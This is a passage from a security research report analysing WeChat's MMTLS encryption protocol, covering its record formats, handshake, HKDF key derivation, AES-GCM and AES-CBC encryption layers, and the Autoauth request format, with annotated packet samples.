<p>Each MMTLS packet contains one or more <em>MMTLS records</em> (which are similar in structure and purpose to <a href="https://datatracker.ietf.org/doc/html/rfc8446#section-5" target="_blank" rel="noopener"><u>TLS records</u></a>). Records are units of messages that carry handshake data, application data, or alert/error message data within each MMTLS packet.</p>
<h3 id="a.-mmtls-records">1A. MMTLS Records</h3>
<p>Records can be identified by different <em>record headers</em>, a fixed 3-byte sequence preceding the record contents. In particular, we observed 4 different record types, with the corresponding <em>record headers</em>:</p>
<figure><table>
<tbody>
<tr>
<td>Handshake-Resumption Record</td>
<td><code>19 f1 04</code></td>
</tr>
<tr>
<td>Handshake Record</td>
<td><code>16 f1 04</code></td>
</tr>
<tr>
<td>Data Record</td>
<td><code>17 f1 04</code></td>
</tr>
<tr>
<td>Alert Record</td>
<td><code>15 f1 04</code></td>
</tr>
</tbody>
</table></figure>
<p><em>Handshake</em> records contain metadata and the key establishment material needed for the other party to derive the same shared session key using Diffie-Hellman. <em>Handshake-Resumption</em> record contains sufficient metadata for “resuming” a previously established session, by re-using previously established key material. <em>Data</em> records can contain encrypted ciphertext that carries meaningful WeChat request data. Some <em>Data</em> packets simply contain an encrypted no-op heartbeat. <em>Alert</em> records signify errors or signify that one party intends to end a connection. In MMTLS, all non-handshake records are encrypted, but the key material used differs based on which stage of the handshake has been completed.</p>
<p>Here is an annotated MMTLS packet from the server containing a <em>Handshake</em> record:<br>
<a href="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record.png&amp;nocache=1"><img decoding="async" src="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record.png&amp;nocache=1" alt="" width="331" height="63" title="Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol 1" srcset="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record.png&amp;nocache=1 331w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record-300x57.png&amp;nocache=1 300w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record-297x57.png&amp;nocache=1 297w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/handshake-record-180x34.png&amp;nocache=1 180w" sizes="(max-width: 331px) 100vw, 331px"></a><br>
Here is an example of a <strong>Data</strong> record sent from the client to the server:<br>
<a href="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record.png&amp;nocache=1"><img decoding="async" src="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record.png&amp;nocache=1" alt="" width="331" height="33" title="Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol 2" srcset="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record.png&amp;nocache=1 331w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record-300x30.png&amp;nocache=1 300w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record-297x30.png&amp;nocache=1 297w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/data-record-180x18.png&amp;nocache=1 180w" sizes="(max-width: 331px) 100vw, 331px"></a></p>
<p>To give an example of how these records interact, generally the client and server will exchange <em>Handshake</em> records until the Diffie-Hellman handshake is complete and they have established shared key material. Afterwards, they will exchange <em>Data</em> records, encrypted using the shared key material. When either side wants to close the connection, they will send an <em>Alert</em> record. More illustrations of each record type’s usage will be made in the following section.</p>
<h3 id="b.-mmtls-extensions">1B. MMTLS Extensions</h3>
<p>As MMTLS’ wire protocol is heavily modeled after TLS, we note that it has also borrowed the wire format of “<a href="https://datatracker.ietf.org/doc/html/rfc6066" target="_blank" rel="noopener"><u>TLS Extensions</u></a>” to exchange relevant encryption data during the handshake. Specifically, MMTLS uses the same format as TLS Extensions for the Client to communicate their key share (i.e. the client’s public key) for Diffie-Hellman, similar to TLS 1.3’s <a href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.2.8" target="_blank" rel="noopener"><em><u>key_share</u></em></a> extension, and to communicate session data for session resumption (similar to TLS 1.3’s <a href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.2.11" target="_blank" rel="noopener"><em><u>pre_shared_key</u></em></a> extension). In addition, MMTLS has support for <a href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.3.1" target="_blank" rel="noopener"><em><u>Encrypted Extensions</u></em></a>, similar to TLS, but they are currently not used in MMTLS (i.e., the <em>Encrypted Extensions</em> section is always empty).</p>
<h2 id="mmtls-encryption">2. MMTLS Encryption</h2>
<p>This section describes the outer layer of encryption, that is, what keys and encryption functions are used to encrypt and decrypt the ciphertexts found in the <strong>“</strong>MMTLS Wire Format” section, and how the encryption keys are derived.</p>
<p>The encryption and decryption at this layer occurs in the STN module, in a separate spawned “com.tencent.mm:push”<a id="fnref2" role="doc-noteref" href="#fn2"><sup>2</sup></a> process on Android. The spawned process ultimately transmits and receives data over the network. The code for all of the MMTLS Encryption and MMTLS serialization were analyzed from the library <code>libwechatnetwork.so</code>. In particular, we studied the <code>Crypt()</code> function, a central function used for all encryption and decryption whose name we derived from debug logging code. We also hooked all calls to <a href="https://github.com/OneSignal/openssl/blob/main/crypto/kdf/hkdf.c#L26" target="_blank" rel="noopener"><u>HKDF_Extract</u></a>() and <a href="https://github.com/OneSignal/openssl/blob/main/crypto/kdf/hkdf.c#L31" target="_blank" rel="noopener"><u>HKDF_Expand</u></a>(), the OpenSSL functions for <a href="https://en.wikipedia.org/wiki/HKDF" target="_blank" rel="noopener"><u>HKDF</u></a>, in order to understand how keys are derived.</p>
<p>When the “:push” process is spawned, it starts an event loop in HandshakeLoop(), which processes all outgoing and incoming MMTLS Records. We hooked all functions called by this event loop to understand how each MMTLS Record is processed. The code for this study, as well as the internal function addresses identified for the particular version of WeChat we studied, can be found in the <a href="https://github.com/citizenlab/wechat-security-report/tree/main" target="_blank" rel="noopener"><u>Github repository</u></a>.</p>
<figure><p><a href="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2.png&amp;nocache=1"><img fetchpriority="high" decoding="async" src="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2.png&amp;nocache=1" alt="" width="861" height="473" title="Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol 3" srcset="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2.png&amp;nocache=1 861w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-300x165.png&amp;nocache=1 300w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-768x422.png&amp;nocache=1 768w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-605x332.png&amp;nocache=1 605w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-297x163.png&amp;nocache=1 297w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-500x275.png&amp;nocache=1 500w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image2-180x99.png&amp;nocache=1 180w" sizes="(max-width: 861px) 100vw, 861px"></a></p><figcaption>Figure 1: Network requests: MMTLS encryption connection over longlink and over shortlink. Each box is an MMTLS Record, and each arrow represents an “MMTLS packet” sent over either Longlink (i.e., a single TCP packet) or shortlink (i.e., in the body of HTTP POST). Once both sides have received the DH keyshare, all further records are encrypted.</figcaption></figure>
<h3 id="a.-handshake-and-key-establishment">2A. Handshake and key establishment</h3>
<p>In order for Business-layer Encryption to start sending messages and establish keys, it has to use the MMTLS Encryption tunnel. Since the key material for the MMTLS Encryption has to be established first, the handshakes in this section happen before any data can be sent or encrypted via Business-layer Encryption. The end goal of the MMTLS Encryption handshake discussed in this section is to establish a common secret value that is known only to the client and server.</p>
<p>On a fresh startup of WeChat, it tries to complete one MMTLS handshake over Shortlink, and one MMTLS handshake over Longlink, resulting in two MMTLS encryption tunnels, each using different sets of encryption keys. For Longlink, after the handshake completes, the same Longlink (TCP) connection is kept open to transport future encrypted data. For Shortlink, the MMTLS handshake is completed in the first HTTP request-response cycle, then the first HTTP connection closes. The established keys are stored by the client and server, and when data needs to be sent over Shortlink, those established keys are used for encryption, then sent over a newly established Shortlink connection. In the remainder of this section, we describe details of the handshakes.</p>
<h4 id="clienthello">ClientHello</h4>
<p>First, the client generates keypairs on the <a href="https://neuromancer.sk/std/secg/secp256r1" target="_blank" rel="noopener"><u>SECP256R1</u> <u>elliptic curve</u></a>. Note that these elliptic curve keys are entirely separate pairs from those generated in the Business-layer Encryption section. The client also reads some Resumption Ticket data from a file stored on local storage named <strong><code>psk.key</code>,</strong> if it exists. The <code><strong>psk.key</strong></code> file is written to after the first ServerHello is received, so, on a fresh install of WeChat, the resumption ticket is omitted from the ClientHello.</p>
<p>The client first simultaneously sends a ClientHello message (contained in a Handshake record) over both the Shortlink and Longlink. The first of these two handshakes that completes successfully is the one that the initial Business-layer Encryption handshake occurs over (details of Business-layer Encryption are discussed in Section 4). Both Shortlink and Longlink connections are used afterwards for sending other data.</p>
<p>In both the initial Shortlink and Longlink handshake, each ClientHello packet contains the following data items:</p>
<ul>
<li>ClientRandom (32 bytes of randomness)</li>
<li>Resumption Ticket data read from psk.key, if available</li>
<li>Client public key</li>
</ul>
<p>An abbreviated version of the MMTLS ClientHello is shown below.</p>
<div>
<pre><span>16 f1 04 (Handshake Record header) . . .</span>
01 04 f1 (ClientHello) . . .
08 cd 1a 18 f9 1c . . . (ClientRandom) . . .
00 0c c2 78 00 e3 . . . (Resumption Ticket from psk.key) . . .
04 0f 1a 52 7b 55 . . . (Client public key) . . .
</pre>
</div>
<p>Note that the client generates <strong>a separate keypair</strong> for the Shortlink ClientHello and the Longlink ClientHello. The Resumption Ticket sent by the client is the same on both ClientHello packets because it is always read from the same psk.key file. On a fresh install of WeChat, the Resumption Ticket is omitted since there is no psk.key file.</p>
<h4 id="serverhello">ServerHello</h4>
<p>The client receives a ServerHello packet in response to each ClientHello packet. Each contains:</p>
<ul>
<li>A record containing ServerRandom and Server public key</li>
<li>Records containing <strong>encrypted</strong> server certificate, new resumption ticket, and a ServerFinished message.</li>
</ul>
<p>An abbreviated version of the MMTLS ServerHello is shown below; a full packet sample with labels can be found in the <a href="https://docs.google.com/document/d/1Ub195WcLUY8YGJoGKW5IlhIIGaUWFzcM7aovNWqnFL4/edit" target="_blank" rel="noopener"><u>annotated network capture</u></a>.</p>
<div>
<pre><span>16 f1 04 (Handshake Record header) . . .</span>
02 04 f1 (ServerHello) . . .
2b a6 88 7e 61 5e 27 eb . . . (ServerRandom) . . .
04 fa e3 dc 03 4a 21 d9 . . . (Server public key) . . .
<span>16 f1 04 (Handshake Record header) . . .</span>
<span>b8 79 a1 60 be 6c</span> . . . (<strong>ENCRYPTED</strong> server certificate) . . .
<span>16 f1 04 (Handshake Record header) . . .</span>
<span>1a 6d c9 dd 6e f1</span> . . . (<strong>ENCRYPTED</strong> NEW resumption ticket) . . .
<span>16 f1 04 (Handshake Record header) . . .</span>
<span>b8 79 a1 60 be 6c </span>. . . (<strong>ENCRYPTED</strong> ServerFinished) . . .
</pre>
</div>
<p>On receiving the server public key, the client generates</p>
<p><code>secret = ecdh(client_private_key, server_public_key).</code></p>
<p>Note that since each MMTLS encrypted tunnel uses a different pair of client keys, the shared secret, and any derived keys and IVs will be different between MMTLS tunnels. This also means Longlink handshake and Shortlink handshake each compute a different shared secret.</p>
<p>Then, the shared secret is used to derive several sets of cryptographic parameters via HKDF, a mathematically secure way to transform a short secret value into a long secret value. In this section, we will focus on the <em>handshake parameters</em>. Alongside each set of keys, <a href="https://www.techtarget.com/whatis/definition/initialization-vector-IV" target="_blank" rel="noopener"><u>initialization vectors (IVs)</u></a> are also generated. The IV is a value that is needed to initialize the <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" target="_blank" rel="noopener"><u>AES-GCM</u></a> encryption algorithm. IVs do not need to be kept secret. However, they need to be random and not reused.</p>
<p>The <em>handshake parameters</em> are generated using HKDF (“handshake key expansion” is a constant string in the program, as well as other monotype double quoted strings in this section):</p>
<p><code>key_enc, key_dec, iv_enc, iv_dec = HKDF(secret, 56, “handshake key expansion”)</code></p>
<p>Using <code>key_dec</code> and <code>iv_dec</code>, the client can decrypt the remainder of the ServerHello records. Once decrypted, the client validates the server certificate. Then, the client also saves the new Resumption Ticket to the file <code>psk.key</code>.</p>
<p>At this point, since the shared <code>secret</code> has been established, the MMTLS Encryption Handshake is considered completed. To start encrypting and sending data, the client derives other sets of parameters via HKDF from the shared secret. The details of which keys are derived and used for which connections are fully specified in <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/outer-crypto.md#full-key-derivation-details" target="_blank" rel="noopener"><u>these notes</u></a> where we annotate the keys and connections created on WeChat startup.</p>
<h3 id="b.-data-encryption">2B. Data encryption</h3>
<p>After the handshake, MMTLS uses AES-GCM with a particular key and IV, which are tied to the particular MMTLS tunnel, to encrypt data. The IV is incremented by the number of records previously encrypted with this key. This is important because re-using an IV with the same key destroys the confidentiality provided in AES-GCM, as it can lead to a key recovery attack using the known tag.</p>
<p><code>ciphertext, tag = AES-GCM(input, key, iv+n)</code><br>
<code>ciphertext = ciphertext | tag</code></p>
<p>The 16-byte tag is appended to the end of the ciphertext. This tag is authentication data computed by <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" target="_blank" rel="noopener"><u>AES-GCM</u></a>; it functions as a <a href="https://en.wikipedia.org/wiki/Message_authentication_code" target="_blank" rel="noopener"><u>MAC</u></a> in that when verified properly, this data provides authentication and integrity. In many cases, if this is a Data record being encrypted, <code>input</code> contains metadata and ciphertext that has already been encrypted as described in the Business-layer Encryption section.</p>
<p>We separately discuss data encryption in Longlink and Shortlink in the following subsections.</p>
<h4 id="b1.-longlink">2B1. Longlink</h4>
<p>Client-side Encryption for Longlink packets is done using AES-GCM with <strong>key_enc</strong> and <strong>iv_enc</strong> derived earlier in the handshake. Client-side Decryption uses <strong>key_dec</strong> and <strong>iv_dec</strong>. Below is a sample Longlink (TCP) packet containing a single data record containing an encrypted heartbeat message from the server<a id="fnref3" role="doc-noteref" href="#fn3"><sup>3</sup></a>:</p>
<div>
<pre><span>17 f1 04</span>     RECORD HEADER (of type “DATA”)
00 20                                           RECORD LENGTH
<span>e6 55 7a d6 82 1d a7 f4 2b 83 d4 b7 78 56 18 f3</span>         <span>ENCRYPTED DATA</span>
<span>1b 94 27 e1 1e c3 01 a6 f6 23 6a bc 94 eb 47 39</span>             <span>TAG (MAC)</span>
</pre>
</div>
<p>Within a long-lived Longlink connection, the IV is incremented for each record encrypted. If a new Longlink connection is created, the handshake is restarted and new key material is generated.</p>
<h4 id="b2.-shortlink">2B2. Shortlink</h4>
<p>Shortlink connections can only contain a single MMTLS packet request and a single MMTLS packet response (via HTTP POST request and response, respectively). After the initial Shortlink ClientHello sent on startup, WeChat will send ClientHello with Handshake Resumption packets. These records have the header 19 f1 04 instead of the 16 f1 04 on the regular ClientHello/ServerHello handshake packets.</p>
<p>An abbreviated sample of a Shortlink request packet containing Handshake Resumption is shown below.</p>
<div>
<pre><span>19 f1 04 (Handshake Resumption Record header) . . .</span>
01 04 f1 (ClientHello) . . .
9b c5 3c 42 7a 5b 1a 3b . . . (ClientRandom) . . .
71 ae ce ff d8 3f 29 48 . . . (NEW Resumption Ticket) . . .
<span>19 f1 04 (Handshake Resumption Record header) . . .</span>
<span>47 4c 34 03 71 9e</span> . . . (<strong>ENCRYPTED</strong> Extensions) . . .
<span>17 f1 04 (Data Record header) . . .</span>
<span>98 cd 6e a0 7c 6b</span> . . . (<strong>ENCRYPTED</strong> EarlyData) . . .
<span>15 f1 04 (Alert Record header)</span> . . .
<span>8a d1 c3 42 9a 30</span> . . . (<strong>ENCRYPTED</strong> Alert (ClientFinished)) . . .
</pre>
</div>
<p>Note that, based on our understanding of the MMTLS protocol, the ClientRandom sent in this packet is not used at all by the server, because there is no need to re-run Diffie-Hellman in a resumed session. The Resumption Ticket is used by the server to identify which prior-established shared secret should be used to decrypt the following packet content.</p>
<p>Encryption for Shortlink packets is done using AES-GCM with the <em>handshake parameters</em> <strong>key_enc</strong> and <strong>iv_enc</strong>. (Note that, despite their identical name, <strong>key_enc</strong> and <strong>iv_enc</strong> here are different from those of the Longlink, since Shortlink and Longlink each complete their own handshake using different elliptic curve client keypair.) The <strong>iv_enc</strong> is incremented for each record encrypted. Usually, EarlyData records sent over <strong>S</strong>hortlink contain ciphertext that has been encrypted with Business-layer Encryption as well as associated metadata. This metadata and ciphertext will then be additionally encrypted at this layer.</p>
<p>The reason this is referred to as EarlyData internally in WeChat is likely due to it being borrowed from <a href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.2.10" target="_blank" rel="noopener"><u>TLS</u></a>; typically, it refers to the data that is encrypted with a key derived from a pre-shared key, before the establishment of a regular session key via Diffie-Hellman. However, in this case, when using Shortlink, there is no data sent “after the establishment of a regular session key”, so almost all Shortlink data is encrypted and sent in this EarlyData section.</p>
<p>Finally, <code>ClientFinished</code> indicates that the client has finished its side of the handshake. It is an encrypted Alert record with a fixed message that always follows the EarlyData Record. From our reverse-engineering, we found that the handlers for this message referred to it as <code>ClientFinished</code>.</p>
<h2 id="business-layer-request">3. Business-layer Request</h2>
<p>MMTLS Data Records either carry an “Business-layer request” or heartbeat messages. In other words, if one decrypts the payload from an MMTLS Data Record, the result will often be messages described below.</p>
<p>This Business-layer request contains several metadata parameters that describe the purpose of the request, including the internal URI and the request type number, which we briefly described in the “Launching a WeChat network request” section.</p>
<p>When logged-in, the format of a Business-layer request looks like the following:</p>
<div>
<pre><span>00 00 00 7b</span>                 (total data length)
<span>00 24</span>                       (URI length)
/cgi-bin/micromsg-bin/...   (URI)
<span>00 12</span>                       (hostname length)
sgshort.wechat.com          (hostname)
<span>00 00 00 3D</span>                 (length of rest of data)
<span>BF B6 5F</span>                    (request flags)
<span>41 41 41 41</span>                 (user ID)
<span>42 42 42 42</span>                 (device ID)
<span>FC 03 48 02 00 00 00 00</span>     (cookie)
<span>1F 9C 4C 24 76 0E 00</span>        (cookie)
<span>D1 05 varint</span>                (request_type)
<span>0E 0E 00 02</span>                 (4 more varints)
<span>BD 95 80 BF 0D varint</span>       (signature)
<span>FE</span>                          (flag)
<span>80 D2 89 91</span>
<span>04 00 00</span>                    (marks start of data)
<span>08 A6 29 D1 A4 2A CA F1</span> ... (ciphertext)
</pre>
</div>
<p>Responses are formatted very similarly:</p>
<div>
<pre><span>bf b6 5f</span>                    (flags)
<span>41 41 41 41</span>                 (user ID)
<span>42 42 42 42</span>                 (device ID)
<span>fc 03 48 02 00 00 00 00</span>     (cookie)
<span>1f 9c 4c 24 76 0e 00</span>        (cookie)
<span>fb 02 varint</span>                (request_type)
<span>35 35 00 02 varints</span>
<span>a9 ad 88 e3 08 varint</span>       (signature)
<span>fe</span>
<span>ba da e0 93</span>
<span>04 00 00</span>                    (marks start of data)
<span>b6 f8 e9 99 a1 f4 d1 20</span> . . . ciphertext
</pre>
</div>
<p>This request then contains another encrypted ciphertext, which is encrypted by what we refer to as Business-layer Encryption. Business-layer Encryption is separate from the system we described in the <strong>MMTLS Encryption</strong> section. The <code>signature</code> mentioned above is the output of <code>genSignature()</code>, which is discussed in the “Integrity check” section. Pseudocode for the serialization schemes and more samples of WeChat’s encrypted request header can be found in our <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/wechat-encrypted-request-format.md" target="_blank" rel="noopener"><u>Github repository</u></a>.</p>
<h2 id="business-layer-encryption">4. Business-layer Encryption</h2>
<p><a href="https://docs.google.com/drawings/d/1WSZY_R8XBliTDrb3tSkmoZpaq3lsud0sBaWRuygGuJo/edit" target="_blank" rel="noopener"><u>WeChat Crypto diagrams (inner layer)</u></a></p>
<p>This section describes how the Business-layer requests described in <strong>Section 3</strong> are encrypted and decrypted, and how the keys are derived. We note that the set of keys and encryption processes introduced in this section are completely separate from those referred to in the MMTLS Encryption section. Generally, for Business-layer Encryption, much of the protocol logic is handled in the Java code, and the Java code calls out to the C++ libraries for encryption and decryption calculations. Whereas for MMTLS Encryption everything is handled in C++ libraries, and occurs on a different process entirely. There is very little interplay between these two layers of encryption.</p>
<p>The Business-layer Encryption has two modes using different cryptographic processes: <em>Asymmetric Mode</em> and <em>Symmetric Mode</em>. To transition into Symmetric Mode, WeChat needs to perform an <em>Autoauth</em> request. Upon startup, WeChat typically goes through the three following stages:</p>
<ol type="1">
<li>Before the user logs in to their account, Business-layer Encryption first uses asymmetric cryptography to derive a shared secret via <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange#Ephemeral_and/or_static_keys" target="_blank" rel="noopener"><u>static Diffie-Hellman</u></a> (static DH), then uses the shared secret as a key to AES-GCM encrypt the data. We name this Asymmetric Mode. In Asymmetric Mode, the client derives a new shared secret for each request.</li>
<li>Using Asymmetric Mode, WeChat can send an Autoauth request, to which the server would return an Autoauth response, which contains a <code><strong>session_key</strong></code>.</li>
<li>After the client obtains <code>session_key</code>, Business-layer Encryption uses it to <a href="https://docs.anchormydata.com/docs/what-is-aes-256-cbc" target="_blank" rel="noopener"><u>AES-CBC</u></a> encrypt the data. We name this Symmetric Mode since it only uses symmetric cryptography. Under Symmetric Mode, the same <code>session_key</code> can be used for multiple requests.</li>
</ol>
<p>For <em>Asymmetric Mode</em>, we performed dynamic and static analysis of C++ functions in libwechatmm.so; in particular the <code>HybridEcdhEncrypt()</code> and <code>HybridEcdhDecrypt()</code> functions, which call <code>AesGcmEncryptWithCompress()</code> / <code>AesGcmDecryptWithUncompress()</code>, respectively.</p>
<p>For <em>Symmetric Mode</em>, the requests are handled in <code>pack()</code>, <code>unpack()</code>, and <code>genSignature()</code> functions in <code>libMMProtocalJNI.so</code>. Generally, <code>pack()</code> handles outgoing requests, and <code>unpack()</code> handles incoming responses to those requests. They also perform encryption/decryption. Finally, <code>genSignature()</code> computes a checksum over the full request. In the Github repository, we’ve uploaded pseudocode for <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/reversing-notes.md#pack-notes" target="_blank" rel="noopener"><u>pack</u></a>, <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/reversing-notes.md#aesencrypt-cbc" target="_blank" rel="noopener"><u>AES-CBC</u></a> encryption, and the <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/reversing-notes.md#gensignature" target="_blank" rel="noopener"><u>genSignature</u></a> routine.</p>
<p>The Business-layer Encryption is also tightly integrated with WeChat’s user authentication system. The user needs to log in to their account before the client is able to send an Autoauth request. For clients that have not logged in, they exclusively use Asymmetric Mode. For clients that have already logged in, their first Business-layer packet would most often be an Autoauth request encrypted using Asymmetric Mode, however, the second and onward Business-layer packets are encrypted using Symmetric Mode.</p>
<figure><p><a href="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3.png&amp;nocache=1"><img loading="lazy" decoding="async" src="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3.png&amp;nocache=1" alt="" width="842" height="363" title="Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol 4" srcset="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3.png&amp;nocache=1 842w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-300x129.png&amp;nocache=1 300w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-768x331.png&amp;nocache=1 768w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-605x261.png&amp;nocache=1 605w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-297x128.png&amp;nocache=1 297w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-500x216.png&amp;nocache=1 500w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image3-180x78.png&amp;nocache=1 180w" sizes="(max-width: 842px) 100vw, 842px"></a></p><figcaption><strong>Figure 2: Business-layer encryption, logged-out, logging-in, and logged-in:</strong> Swimlane diagrams showing at a high-level what Business-layer Encryption requests look like, including which secrets are used to generate the key material used for encryption. 🔑secret is generated via DH(static server public key, client private key), and 🔑<strong>new_secret</strong> is DH(server public key, client private key). 🔑<strong>session</strong> is decrypted from the first response when logged-in. Though it isn’t shown above, 🔑<strong>new_secret</strong> is also used in <strong>genSignature()</strong> when logged-in; this signature is sent with request and response metadata.</figcaption></figure>
<h3 id="a.-business-layer-encryption-asymmetric-mode">4A. Business-layer Encryption, Asymmetric Mode</h3>
<p>Before the user logs in to their WeChat account, the Business-layer Encryption process uses a <em>static server public key</em>, and generates new client keypair to agree on a static Diffie-Hellman shared secret for every WeChat network request. The shared secret is run through the HKDF function and any data is encrypted with AES-GCM and sent alongside the generated client public key so the server can calculate the shared secret.</p>
<p>For each request, the client generates a public, private keypair for use with <a href="https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman" target="_blank" rel="noopener"><u>ECDH</u></a>. We also note that the client has a static server public key pinned in the application. The client then calculates an initial secret.</p>
<p><code>secret = <a href="https://github.com/openssl/openssl/blob/79c8dcf3985a7b75eac8e53eb8652728af6c5d3d/crypto/ec/ec_kmeth.c#L151" target="_blank" rel="noopener"><u>ECDH</u></a>(static_server_pub, client_priv)</code><br>
<code>hash = sha256(client_pub)</code><br>
<code>client_random = &lt;32 randomly generated bytes&gt;</code><br>
<code>derived_key = HKDF(secret)</code></p>
<p><code>derived_key</code> is then used to AES-GCM encrypt the data, which we describe in detail in the next section.</p>
<h3 id="b.-business-layer-encryption-obtaining-session_key">4B. Business-layer Encryption, obtaining session_key</h3>
<p>If the client is logged-in (i.e., the user has logged in to a WeChat account on a previous app run), the first request will be a very large data packet authenticating the client to the server (referred to as Autoauth in WeChat internals) which also contains key material. We refer to this request as the Autoauth request. In addition, the client pulls a locally-stored key <code>autoauth_key</code>, which we did not trace the provenance of, since it does not seem to be used other than in this instance. The key for encrypting this initial request (<code>authrequest_data</code>) is derived_key, calculated in the same way as in Section 4A. The encryption described in the following is the Asymmetric Mode encryption, albeit a special case where the data is the <code>authrequest_data</code>.</p>
<p>Below is an abbreviated version of a serialized and encrypted Autoauth request:</p>
<div>
<pre>    08 01 12 . . . [Header metadata]
    04 46 40 96 4d 3e 3e 7e [client_publickey] . . .
    fa 5a 7d a7 78 e1 ce 10 . . . [ClientRandom encrypted w secret]
    a1 fb 0c da . . .               [IV]
    9e bc 92 8a 5b 81 . . .         [tag]
    db 10 d3 0f f8 e9 a6 40 . . . [ClientRandom encrypted w autoauth_key]
    75 b4 55 30 . . .               [IV]
    d7 be 7e 33 a3 45 . . .         [tag]
    c1 98 87 13 eb 6f f3 20 . . . [<strong>authrequest_data</strong> encrypted w derived_key]
    4c ca 86 03 . .                 [IV]
    3c bc 27 4f 0e 7b . . .         [tag]
</pre>
</div>
<p>A full sample of the Autoauth request and response at each layer of encryption can be found in the <a href="https://github.com/citizenlab/wechat-security-report/tree/main/data" target="_blank" rel="noopener"><u>Github repository</u></a>. Finally, we note that the <code>autoauth_key</code> above does not seem to be actively used outside of encrypting in this particular request. We suspect this is vestigial from a legacy encryption protocol used by WeChat.</p>
<p>The client encrypts here using AES-GCM with a randomly generated IV, and uses a SHA256 hash of the preceding message contents as <a href="https://datatracker.ietf.org/doc/html/rfc5084#section-1.4" target="_blank" rel="noopener"><u>AAD</u></a>. At this stage, the messages (including the ClientRandom messages) are always <a href="https://en.wikipedia.org/wiki/Zlib" target="_blank" rel="noopener"><u>ZLib</u></a> compressed before encryption.</p>
<p><code>iv = &lt;12 random bytes&gt;<br>
compressed = zlib_compress(plaintext)<br>
ciphertext, tag = AESGCM_encrypt(compressed, aad = hash(previous), derived_key, iv)<br>
</code></p>
<p>In the above, previous is the header of the request (i.e. all header bytes preceding the 04 00 00 marker of data start). The client appends the 12-byte IV, then the 16-byte tag, onto the ciphertext. This tag can be used by the server to verify the integrity of the ciphertext, and essentially functions as a <a href="https://en.wikipedia.org/wiki/Message_authentication_code" target="_blank" rel="noopener"><u>MAC</u></a>.</p>
<h4 id="b1.-obtaining-session_key-autoauth-response">4B1. Obtaining session_key: Autoauth Response</h4>
<p>The response to autoauth is serialized similarly to the request:</p>
<div>
<pre>08 01 12 . . . [Header metadata]
04 46 40 96 4d 3e 3e 7e [new_server_pub] . . .
c1 98 87 13 eb 6f f3 20 . . . [<strong>authresponse_data</strong> encrypted w new_secret]
4c ca 86 03 . . [IV]
3c bc 27 4f 0e 7b . . . [tag]
</pre>
</div>
